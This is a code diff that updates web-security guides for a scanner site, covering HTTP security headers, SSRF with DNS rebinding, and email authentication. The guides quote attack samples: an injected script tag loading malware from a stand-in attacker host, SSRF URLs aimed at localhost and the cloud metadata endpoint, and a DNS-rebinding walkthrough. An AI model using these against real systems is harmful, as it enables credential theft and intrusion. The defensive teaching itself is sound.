@@ -11,7 +11,7 @@ reading time, JSON-LD) that benefits both SEO and readers.
 """
 
 # Last meaningful content review. Surfaced to readers and in the sitemap.
-GUIDES_UPDATED = "2026-06-23"
+GUIDES_UPDATED = "2026-07-06"
 
 GUIDES = [
     {
@@ -133,116 +133,101 @@ grades exactly these items and tells you what to fix first.</p>
     },
     {
         "slug": "http-security-headers",
-        "title": "HTTP Security Headers: A Practical Checklist",
-        "description": (
-            "What CSP, HSTS, X-Frame-Options, Referrer-Policy and other security "
-            "headers do, why they matter, and recommended values you can copy."
-        ),
+        "title": "HTTP Security Headers: CSP, HSTS and X-Frame-Options Explained",
+        "description": "How a handful of HTTP response headers — CSP, HSTS, X-Frame-Options, X-Content-Type-Options and Referrer-Policy — defend against XSS, clickjacking, SSL stripping and data leaks.",
         "category": "Hardening",
         "icon": "shield",
-        "read_time": "10 min read",
+        "read_time": "9 min read",
         "body": """
-<p class="guide-lead">Security headers are short instructions your server sends with
-every response that tell the browser how to behave more defensively. They are some
-of the highest-value, lowest-effort security improvements available: a few lines of
-configuration can neutralise entire classes of attack. This guide walks through the
-headers that matter, what each one defends against, and a recommended value you can
-adapt.</p>
+<p class="guide-lead">Web traffic is not just the page body — the HTML, CSS and JavaScript your
+browser renders. It also carries HTTP response headers: invisible directives the server
+sends to the browser telling it how to behave. HTTP security headers are among the fastest,
+cheapest and most effective ways to raise a site's security posture, without rewriting a
+single line of business logic. This guide covers the headers every site should send in 2026.</p>
 
-<h2>Why headers, not code?</h2>
-<p>Many web attacks happen inside the visitor's browser — cross-site scripting,
-clickjacking, content sniffing. The browser is the one place with enough context to
-stop them, but it needs to be told what rules to enforce. Security headers are that
-instruction channel. Because they are set centrally on the server, they protect
-every page at once without touching application logic.</p>
+<h2>1. Content-Security-Policy (CSP): the shield against XSS</h2>
+<p><strong>Cross-Site Scripting (XSS)</strong> lets an attacker inject malicious JavaScript into
+a page other users view, stealing sessions and passwords. <strong>Content-Security-Policy</strong>
+is the strongest defence against it. Instead of hoping your application filters every dangerous
+input, CSP tells the browser exactly which domains it may load and execute scripts, styles, images
+and fonts from — a strict allow-list.</p>
+<p>If an attacker manages to inject <code>&lt;script src="http://hacker-site.com/malware.js"&gt;&lt;/script&gt;</code>,
+the browser reads the CSP, sees that <code>hacker-site.com</code> is not on the allow-list, and
+refuses to download or run it.</p>
+<h3>Example of a strong policy</h3>
+<pre><code>Content-Security-Policy: default-src 'self'; script-src 'self' https://analytics.my-site.com; img-src 'self' data:; frame-ancestors 'none'</code></pre>
+<p>This policy says:</p>
+<ul>
+  <li>By default, everything may load only from the site's own origin (<code>'self'</code>).</li>
+  <li>Scripts may run only if they come from the same origin or the approved analytics service. No
+  <strong>inline</strong> scripts (written directly in the HTML) will execute.</li>
+  <li>No other website can embed the page inside an iframe (<code>frame-ancestors 'none'</code>),
+  preventing clickjacking.</li>
+</ul>
+<p>Roll CSP out in report-only mode first (<code>Content-Security-Policy-Report-Only</code>), watch
+what it would have blocked, then enforce. Avoid <code>'unsafe-inline'</code> and <code>'unsafe-eval'</code>
+in <code>script-src</code> wherever possible — they reopen the very hole CSP is meant to close.</p>
 
-<h2>Content-Security-Policy (CSP)</h2>
-<p>CSP is the most powerful — and most involved — security header. It defines exactly
-which sources the browser may load scripts, styles, images, fonts and frames from. A
-well-built CSP makes cross-site scripting (XSS) dramatically harder: even if an
-attacker injects a <code>&lt;script&gt;</code> tag, the browser refuses to run it
-unless it comes from an allowed origin.</p>
-<p>A reasonable starting policy for a site that serves its own assets:</p>
-<pre><code>Content-Security-Policy: default-src 'self'; img-src 'self' data:; style-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'</code></pre>
-<p>Build your CSP incrementally. Start in report-only mode
-(<code>Content-Security-Policy-Report-Only</code>), watch what it would have blocked,
-then tighten. Avoid <code>'unsafe-inline'</code> and <code>'unsafe-eval'</code> in
-<code>script-src</code> wherever possible — they reopen the very hole CSP is meant to
-close.</p>
-
-<h2>Strict-Transport-Security (HSTS)</h2>
-<p>HSTS forces browsers to use HTTPS for your domain, even if a user types
-<code>http://</code> or clicks an old link. After the first secure visit, the browser
-remembers the rule for the duration you specify and silently upgrades every request.</p>
+<h2>2. Strict-Transport-Security (HSTS): enforce HTTPS</h2>
+<p>A valid SSL certificate is essential but not enough. When a user types <code>my-site.com</code> into
+the address bar, the browser first tries a cleartext HTTP connection (port 80) before the server can
+redirect it to HTTPS. That window lets an attacker on public Wi-Fi run an <strong>SSL stripping</strong>
+attack, intercepting the cleartext connection before the redirect.</p>
+<p>The <strong>Strict-Transport-Security</strong> header fixes this. Once the browser receives it, it
+remembers — for a specified period, often a year — that the domain must be reached over HTTPS
+only. Every future cleartext HTTP attempt, even one the user types explicitly or clicks from an old
+link, is rewritten to HTTPS by the browser before a single packet leaves the device.</p>
+<h3>Optimal configuration</h3>
 <pre><code>Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</code></pre>
-<p>Only add <code>preload</code> once you are confident every subdomain is HTTPS-only —
-it is hard to undo quickly. The <code>max-age</code> above is one year, the
-recommended value for production.</p>
+<p>This enforces HTTPS for a full year (31,536,000 seconds) and applies the rule to every subdomain.
+Adding <code>preload</code> lets you submit the site to the HSTS preload list baked into Chrome and
+Firefox, protecting even the user's very first visit. Only add <code>preload</code> once you are sure
+every subdomain is HTTPS-only — it is hard to undo quickly.</p>
 
-<h2>X-Frame-Options / frame-ancestors</h2>
-<p>These defend against <strong>clickjacking</strong>, where an attacker loads your
-site inside an invisible frame on their own page and tricks users into clicking
-hidden buttons. To forbid framing entirely:</p>
-<pre><code>X-Frame-Options: DENY
-Content-Security-Policy: frame-ancestors 'none'</code></pre>
-<p>The CSP <code>frame-ancestors</code> directive is the modern replacement and is more
-flexible (you can allow specific origins), but sending both covers older browsers.</p>
+<h2>3. X-Frame-Options (XFO): prevent clickjacking</h2>
+<p><strong>Clickjacking</strong> happens when an attacker embeds your legitimate site inside an invisible
+iframe layered over a decoy page ("Click here to win an iPhone"). The user thinks they are clicking the
+fake button, but they are actually clicking a hidden button on your site — for example authorising a
+bank transfer — because they are already logged in on another tab.</p>
+<p>The <strong>X-Frame-Options</strong> header stops browsers from rendering your page inside a
+<code>&lt;frame&gt;</code>, <code>&lt;iframe&gt;</code> or <code>&lt;object&gt;</code>.</p>
+<h3>Recommended configuration</h3>
+<pre><code>X-Frame-Options: DENY</code></pre>
+<p>Use <code>SAMEORIGIN</code> instead if you need to frame your own pages within your own domain. The CSP
+<code>frame-ancestors</code> directive is the modern successor to X-Frame-Options and supersedes it in
+recent browsers, but it is good practice to set both for backward compatibility.</p>
 
-<h2>X-Content-Type-Options</h2>
-<p>Browsers sometimes try to guess ("sniff") the type of a file, which can turn an
-innocuous upload into an executable script. One value shuts this down:</p>
+<h2>4. X-Content-Type-Options: stop MIME sniffing</h2>
+<p>Older browsers tried to "guess" (MIME-sniff) the content type of a downloaded file, ignoring what the
+server declared. If a user uploaded a malicious text file with a <code>.txt</code> extension containing
+JavaScript, some browsers might arbitrarily decide to run it as a real web script, triggering XSS.</p>
+<p>The <strong>X-Content-Type-Options</strong> header tells the browser to stop guessing and strictly
+honour the MIME type the server declares.</p>
+<h3>The only valid configuration</h3>
 <pre><code>X-Content-Type-Options: nosniff</code></pre>
 
-<h2>Referrer-Policy</h2>
-<p>By default, browsers attach the full URL of the current page to outbound requests
-via the <code>Referer</code> header — potentially leaking query strings, session
-tokens, or internal paths to third parties. A sensible policy:</p>
+<h2>5. Referrer-Policy: protect outbound data</h2>
+<p>When a user clicks a link that leaves your site, their browser sends the destination the exact URL of
+the page they came from (via the <code>Referer</code> header). That URL might contain sensitive
+information or session IDs — for example <code>my-site.com/reset-password?token=12345</code> —
+which would be handed to external sites unintentionally.</p>
+<p><strong>Referrer-Policy</strong> governs how much of that information the origin gives away.</p>
+<h3>Safe configuration</h3>
 <pre><code>Referrer-Policy: strict-origin-when-cross-origin</code></pre>
-<p>This sends the full URL within your own site, only the origin to other HTTPS sites,
-and nothing when downgrading to HTTP.</p>
-
-<h2>Permissions-Policy</h2>
-<p>Formerly Feature-Policy, this header lets you switch off browser features your site
-does not use — camera, microphone, geolocation, USB — so a compromised script cannot
-abuse them:</p>
-<pre><code>Permissions-Policy: camera=(), microphone=(), geolocation=(), usb=()</code></pre>
-
-<h2>Quick-reference table</h2>
-<div class="table-wrapper">
-<table class="table">
-  <thead><tr><th>Header</th><th>Defends against</th><th>Recommended value</th></tr></thead>
-  <tbody>
-    <tr><td>Content-Security-Policy</td><td>XSS, injection</td><td><code>default-src 'self'; object-src 'none'; frame-ancestors 'none'</code></td></tr>
-    <tr><td>Strict-Transport-Security</td><td>Protocol downgrade</td><td><code>max-age=31536000; includeSubDomains</code></td></tr>
-    <tr><td>X-Frame-Options</td><td>Clickjacking</td><td><code>DENY</code></td></tr>
-    <tr><td>X-Content-Type-Options</td><td>MIME sniffing</td><td><code>nosniff</code></td></tr>
-    <tr><td>Referrer-Policy</td><td>Referrer leakage</td><td><code>strict-origin-when-cross-origin</code></td></tr>
-    <tr><td>Permissions-Policy</td><td>Feature abuse</td><td><code>camera=(), microphone=(), geolocation=()</code></td></tr>
-  </tbody>
-</table>
-</div>
-
-<h2>Headers you should remove</h2>
-<p>Defence also means saying less. Headers like <code>Server</code>,
-<code>X-Powered-By</code> and <code>X-AspNet-Version</code> advertise your exact
-software stack and version, handing attackers a shortcut to known exploits. Strip
-them where your platform allows.</p>
-
-<h2>Verify your configuration</h2>
-<p>You can see any site's headers with a single request:</p>
-<pre><code>curl -sI https://example.com</code></pre>
-<p>For a graded report — including a letter score for CSP quality and a list of
-missing headers ranked by impact — run your domain through the
-<a href="/">Security Buddy scanner</a>. The Security Headers section maps directly to
-the checklist above.</p>
+<p>This sends the full URL (with parameters) for same-site navigation, but only the bare domain
+(e.g. <code>https://my-site.com/</code>) when the user moves to an external site, protecting any secrets
+in the path.</p>
 
 <h2>Key takeaways</h2>
 <ul>
-  <li>Security headers stop browser-side attacks that server code cannot.</li>
-  <li>CSP is the highest-impact header — build it gradually in report-only mode.</li>
-  <li>Add HSTS, deny framing, disable MIME sniffing, and tighten the referrer policy.</li>
-  <li>Remove headers that leak your software versions.</li>
+  <li>CSP is your strongest anti-XSS control — allow-list sources and avoid <code>'unsafe-inline'</code>.</li>
+  <li>HSTS with <code>includeSubDomains</code> forecloses SSL stripping after the first visit.</li>
+  <li>X-Frame-Options / <code>frame-ancestors</code> stop clickjacking; <code>nosniff</code> stops MIME confusion.</li>
+  <li>Referrer-Policy keeps secrets in your URLs from leaking to third parties.</li>
 </ul>
+<p>To test whether your server or WAF is injecting these headers correctly, run a quick scan with the
+<a href="/">Security Buddy scanner</a>, which grades and analyses your web application's defensive
+posture instantly.</p>
 """,
     },
     {
@@ -786,6 +771,188 @@ at a glance how spoofable your domain is.</p>
   <li>Deploy all three, rolling DMARC from <code>none</code> to <code>reject</code>.</li>
   <li>Back it with MFA and ongoing awareness training.</li>
 </ul>
+""",
+    },
+    {
+        "slug": "dns-rebinding-ssrf",
+        "title": "SSRF and DNS Rebinding: The Definitive Guide",
+        "description": "How Server-Side Request Forgery works, why naive blacklists fail, how attackers bypass them with DNS rebinding and HTTP redirects, and how to defend with IP pinning.",
+        "category": "Infrastructure",
+        "icon": "server",
+        "read_time": "9 min read",
+        "body": """
+<p class="guide-lead">In recent years, vulnerabilities in backend infrastructure have become a
+favourite target for attackers. Among them, <strong>Server-Side Request Forgery (SSRF)</strong> is one
+of the most critical threats to modern cloud and serverless architectures — it has earned a place
+in the OWASP Top 10. This guide explains what SSRF is, how attackers use advanced techniques like DNS
+rebinding to bypass defences, and how to protect your applications.</p>
+
+<h2>What is Server-Side Request Forgery (SSRF)?</h2>
+<p>SSRF is a web security vulnerability that lets an attacker induce a server-side application to make
+HTTP requests to a domain of the attacker's choosing. In a typical scenario, the attacker forces the
+server to connect to services inside the organisation's infrastructure that the attacker could never
+reach directly from the internet.</p>
+<p>Imagine a web application that lets users paste an image URL to import it as a profile picture. The
+backend (in Python or Node.js) receives the URL and uses a library such as <code>requests</code> or
+<code>axios</code> to download it. If the application does not rigorously validate that URL, an attacker
+could supply <code>http://localhost/admin</code> or <code>http://192.168.1.5/database-backup.zip</code>.
+The server obeys, reads sensitive data from its own internal network, and returns it to the attacker.</p>
+<h3>The main targets of an SSRF attack</h3>
+<ul>
+  <li><strong>Cloud metadata services:</strong> if the app runs on AWS, Google Cloud or Azure, the
+  attacker will try to query special addresses like <code>http://169.254.169.254</code>. These endpoints
+  return IAM credentials, temporary access tokens and SSH keys.</li>
+  <li><strong>Internal and loopback networks:</strong> probing services not exposed to the internet —
+  admin dashboards, Redis instances (often without a password), PostgreSQL databases or monitoring
+  systems.</li>
+  <li><strong>Internal port scanning:</strong> using the vulnerable server to map open ports across the
+  company's internal infrastructure.</li>
+</ul>
+
+<h2>The "naive" defences against SSRF</h2>
+<p>Developers who realise the danger often add blacklist-based filters to block dangerous input — for
+example, a function that rejects requests containing strings like <code>localhost</code>,
+<code>127.0.0.1</code> or <code>169.254.169.254</code>.</p>
+<p>But these defences operate on the URL string and are easily bypassed. An attacker can encode IP
+addresses in unexpected ways (hexadecimal or octal), or — worse — exploit HTTP redirects and the
+DNS system. That is where every security engineer's nightmare comes in: <strong>DNS rebinding</strong>.</p>
+
+<h2>The evolution of the attack: DNS rebinding and TOCTOU</h2>
+<p><strong>TOCTOU (Time-of-Check to Time-of-Use)</strong> is a logic flaw where a system's state changes
+between the moment a condition is checked and the moment the result is used. In SSRF, this takes the
+form of DNS rebinding. Here is how the attack defeats an apparently safe SSRF filter:</p>
+<ol>
+  <li><strong>The bait:</strong> the attacker registers a domain (e.g. <code>safe.com</code>) and sets up
+  a custom DNS server with an extremely low TTL (Time To Live), e.g. 1 second.</li>
+  <li><strong>The check (validation):</strong> the attacker supplies <code>http://safe.com</code> to the
+  vulnerable application. The app performs a DNS lookup to validate the IP. The attacker's DNS server
+  answers with a legitimate public IP (e.g. <code>93.184.216.34</code>). The app sees a public IP and
+  approves the request.</li>
+  <li><strong>The rebinding:</strong> with a 1-second TTL, the DNS answer expires immediately.</li>
+  <li><strong>The use (connection):</strong> having approved the URL, the app uses its HTTP library to
+  fetch it. With the DNS record no longer cached, the library performs a second DNS resolution — and
+  this time the attacker's DNS server answers with the internal target IP: <code>169.254.169.254</code>.</li>
+  <li><strong>The disaster:</strong> the server connects to the cloud metadata endpoint, believing it is
+  connecting to the public IP validated a millisecond earlier. The attacker steals the IAM tokens.</li>
+</ol>
+
+<h2>The other side of the coin: malicious redirects</h2>
+<p>Even without running a custom DNS server, attackers exploit HTTP traffic diversion. If the application
+receives a valid public URL but the remote server responds with an HTTP <code>302</code> redirect to a
+private IP (<code>Location: http://127.0.0.1</code>), many standard HTTP libraries will blindly follow the
+redirect without re-validating the new destination.</p>
+<p>This is why it is essential to disable automatic redirects (<code>allow_redirects=False</code> in Python)
+when handling user-supplied URLs in sensitive contexts.</p>
+
+<h2>How to mitigate SSRF and DNS rebinding at the root</h2>
+<p>Protecting an application from SSRF requires a layered approach (defence in depth). Never rely on simple
+string blacklists.</p>
+<ul>
+  <li><strong>IP/DNS pinning (the gold-standard defence):</strong> the definitive solution against DNS
+  rebinding is to force the HTTP library to connect only to the IP address validated at check time,
+  bypassing the second DNS resolution. In Python or Node.js this often means manipulating sockets or using
+  a custom HTTP adapter to pin the IP while keeping the original <code>Host</code> header intact —
+  critical so you don't break the SSL/TLS handshake and Server Name Indication.</li>
+  <li><strong>Disable or strictly control redirects:</strong> any outbound request triggered by user input
+  should not follow HTTP redirects automatically. If the system receives a <code>301</code> or
+  <code>302</code>, it must extract the new URL, parse it, resolve DNS and validate the IP before deciding
+  whether to follow the next hop. Always cap the maximum number of redirects (e.g. 3).</li>
+  <li><strong>Network isolation (VPC and firewall):</strong> run the workers or services that make outbound
+  calls in isolated networks (a DMZ or isolated subnet) with no access to the local database, other
+  internal APIs, or the cloud metadata IP.</li>
+  <li><strong>Zero-trust architecture:</strong> require cryptographic authentication (e.g. mTLS) for every
+  call to internal services, even from the same local network. If an SSRF'd instance tries to query an
+  internal microservice, that service should reject the request for lack of a valid client certificate.</li>
+</ul>
+<p>Check how robust your application's architecture and redirect handling are with the free
+<a href="/">Security Buddy scanner</a> to spot weak SSRF configurations.</p>
+""",
+    },
+    {
+        "slug": "email-authentication-spf-dkim-dmarc",
+        "title": "Email Security and Deliverability: SPF, DKIM and DMARC Explained",
+        "description": "How SPF, DKIM and DMARC work together to authenticate your email, stop spoofing and phishing, and keep your messages out of the spam folder.",
+        "category": "Email",
+        "icon": "at-sign",
+        "read_time": "9 min read",
+        "body": """
+<p class="guide-lead">Email is still one of the main vectors for business fraud, phishing and ransomware.
+To protect your domain's reputation — and to stop your messages landing in spam, or criminals sending
+forged email in your name — you need to correctly implement three DNS-based security protocols:
+<strong>SPF</strong>, <strong>DKIM</strong> and <strong>DMARC</strong>. This guide explains how they work,
+why they matter, and how to configure them for maximum deliverability.</p>
+
+<h2>Why email is inherently insecure</h2>
+<p>SMTP (Simple Mail Transfer Protocol), used to send email, was designed decades ago with no native way to
+authenticate the sender. By default, anyone with a mail server can send a message spoofing the address in
+the "From" field. This process, known as <strong>email spoofing</strong>, lets attackers send fake invoices
+or phishing links while making the recipient believe they came from your domain.</p>
+<p>To fix this, the industry developed a trio of technologies that work together to verify the sender's
+identity and the integrity of the message.</p>
+
+<h2>1. Sender Policy Framework (SPF): the guest list</h2>
+<p>SPF is the first line of defence. It works like a public "guest list" for your domain: a
+<strong>TXT</strong> record in your DNS that explicitly lists which IP addresses or cloud services
+(Google Workspace, Microsoft 365, Mailchimp, SendGrid&hellip;) are allowed to send email on your domain's
+behalf.</p>
+<p>When a server receives an email (say Gmail), it extracts the sender's domain, queries DNS for the SPF
+record, and compares the IP of the server that physically delivered the message against the list of
+authorised IPs. If the IP is not on the list, the email is treated as suspicious.</p>
+<h3>An example SPF record</h3>
+<pre><code>v=spf1 include:_spf.google.com include:sendgrid.net ~all</code></pre>
+<ul>
+  <li><code>v=spf1</code> — the protocol version.</li>
+  <li><code>include:</code> — delegates authorisation to Google's and SendGrid's servers.</li>
+  <li><code>~all</code> — (soft fail) tells receiving servers to accept the email even if the test fails,
+  but mark it as suspicious. For maximum security use <code>-all</code> (hard fail), which asks receivers to
+  reject unauthorised mail.</li>
+</ul>
+<p><strong>SPF's limitation:</strong> SPF only checks the message envelope (the Return-Path), not the
+<code>From</code> field the user sees in their mail client — a gap closed by DMARC. In addition, an SPF
+record must not exceed 10 recursive DNS lookups; go over that limit and validation fails, causing delivery
+problems.</p>
+
+<h2>2. DomainKeys Identified Mail (DKIM): the wax seal</h2>
+<p>DKIM guarantees two things: that the sender genuinely owns the domain, and that the message was not
+altered (tampered with) in transit across the internet. It works with public/private-key cryptography:</p>
+<ul>
+  <li><strong>Signing (private key):</strong> when your server (e.g. Microsoft 365) sends an email, it
+  computes a mathematical hash of the message content and some important headers, and signs that hash with a
+  secret private key. The signature is added to the message header.</li>
+  <li><strong>Verification (public key):</strong> you publish the matching public key as a TXT record in
+  your DNS.</li>
+  <li><strong>The check:</strong> the receiving server reads the signature, fetches the public key from your
+  DNS and recomputes the hash. If the hashes match, the email is genuine and was not modified by a
+  man-in-the-middle.</li>
+</ul>
+<p>Using strong cryptographic keys (at least 2048-bit) is essential to resist brute-force attempts.</p>
+
+<h2>3. DMARC: the traffic officer</h2>
+<p>SPF and DKIM are excellent, but they operate independently. What should a receiving server do if an email
+passes DKIM but fails SPF, or vice versa? Providers often ended up making arbitrary decisions.</p>
+<p><strong>DMARC (Domain-based Message Authentication, Reporting, and Conformance)</strong> solves this. It is
+a policy published in DNS that tells mail providers worldwide exactly how to behave when they receive email
+in your name that fails SPF and/or DKIM. DMARC also introduces <strong>domain alignment</strong>: it verifies
+that the domain in the <code>From</code> field (the one the end user sees) actually matches the domain
+authenticated by SPF or DKIM. This stops classic spoofing.</p>
+<h3>DMARC policies</h3>
+<p>A DMARC record contains a <code>p=</code> parameter that defines the action on failure:</p>
+<ul>
+  <li><code>p=none</code> — monitoring. No email is blocked. Useful during setup to receive reports and
+  understand who sends in your name.</li>
+  <li><code>p=quarantine</code> — suspicious email is delivered to the recipient's Spam/Junk folder.</li>
+  <li><code>p=reject</code> — maximum security. Suspicious email is categorically bounced. This policy
+  completely prevents your domain being used for phishing.</li>
+</ul>
+<p>A DMARC record also includes email addresses (<code>rua</code> and <code>ruf</code>) to which providers
+worldwide (Google, Yahoo, Microsoft) send daily XML reports detailing which messages passed or failed —
+letting you fix deliverability problems quickly.</p>
+
+<h2>Check your domain's health</h2>
+<p>A misconfigured SPF or DMARC record can wreck the deliverability of your marketing campaigns and business
+communications. Syntax errors, too many DNS lookups in the SPF record, or weak DKIM signatures are common.
+Use the free <a href="/email">Security Buddy email analyzer</a> to instantly scan your domain and check the
+correctness, strength and optimal configuration of your MX, SPF, DMARC and DKIM records.</p>
 """,
     },
     {
